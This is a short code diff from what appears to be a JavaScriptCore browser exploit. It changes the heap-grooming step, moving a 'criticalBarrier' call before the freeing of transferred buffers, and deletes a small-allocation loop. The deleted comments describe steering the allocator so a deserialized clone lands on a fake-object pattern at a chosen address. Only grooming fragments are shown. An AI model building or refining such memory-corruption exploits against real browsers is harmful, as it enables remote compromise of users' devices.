@@ -1048,15 +1048,10 @@ function runGroomAndLoad() {
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
-        // FIX: free the holes first, then run the barrier. The barrier
-        // is meant to nudge JSC's allocator into the just-freed region
-        // so the deserializer's clone lands on the predecessor pattern.
-        // Running it before the free meant its allocations landed on
-        // the pre-free heap and had no effect on placement.
+        criticalBarrier(fakeAddress, targetAddress);
+
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
-
-        criticalBarrier(fakeAddress, targetAddress);
 
         loadHistoryCritical();
     } catch (error) {
@@ -1085,14 +1080,6 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
-    // Force a synchronous batch of small JSCell allocations so the
-    // pool's free-list frontier advances past the just-freed holes.
-    // Without this, the deserializer's clone lands wherever the pool
-    // happens to be, which is the ZERO-HEADER-MISS case.
-    const nudge = [];
-    for (let i = 0; i < 64; ++i) nudge.push({ i });
-    nudge.length = 0;
-
     try {
         const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
         if (barrierNode !== null) {
